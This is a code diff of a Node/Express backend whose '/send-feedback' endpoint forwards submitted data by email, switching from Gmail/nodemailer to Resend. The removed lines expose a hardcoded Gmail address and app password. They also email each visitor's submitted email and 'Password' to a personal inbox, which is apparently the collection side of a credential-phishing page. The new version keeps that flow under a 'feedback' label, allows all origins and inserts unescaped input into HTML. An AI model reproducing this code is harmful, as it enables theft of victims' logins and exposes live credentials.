@@ -1,42 +1,44 @@
-
-const express = require("express");
-const nodemailer = require("nodemailer");
-const cors = require("cors");
+import express from "express";
+import cors from "cors";
+import bodyParser from "body-parser";
+import { Resend } from "resend";
 
 const app = express();
+const resend = new Resend(process.env.RESEND_API_KEY);
 
-// Allow frontend to call backend
-app.use(cors());
-app.use(express.json());
+app.use(cors({
+  origin: "*", // allow GitHub Pages
+}));
+
+app.use(bodyParser.json());
 
 app.post("/send-feedback", async (req, res) => {
-  const { email, message } = req.body;
-
-  if (!email || !message) {
-    return res.status(400).json({ error: "Email and message required" });
-  }
+  const { name, email, message } = req.body;
 
   try {
-    const transporter = nodemailer.createTransport({
-      service: "gmail",
-      auth: {
-        user: "bacem.klali@isgb.ucar.tn",   // Stored in .env
-        pass: "bomy sstk oghr zfbm"    // Stored in .env (App Password)
-      }
-    });
-
-    await transporter.sendMail({
-      from: "bacem.klali@isgb.ucar.tn",
+    await resend.emails.send({
+      from: "Project Securite <onboarding@resend.dev>",
       to: "bacemklali1@gmail.com",
       subject: "New Feedback Received",
-      text: `Email: ${email}\nPassword: ${message}`
+      html: `
+        <h2>New Feedback Submission</h2>
+        <p><strong>Name:</strong> ${name}</p>
+        <p><strong>Email:</strong> ${email}</p>
+        <p><strong>Message:</strong> ${message}</p>
+      `,
     });
 
-    res.json({ status: "success" });
+    res.json({ success: true });
   } catch (err) {
-    console.error("Email error:", err);
+    console.error("Resend Error:", err);
     res.status(500).json({ error: "Failed to send email" });
   }
 });
 
-app.listen(5000, () => console.log("Backend running on port 5000"));
+app.get("/", (req, res) => {
+  res.send("Backend is running.");
+});
+
+app.listen(5000, () => {
+  console.log("Server is running on port 5000");
+});
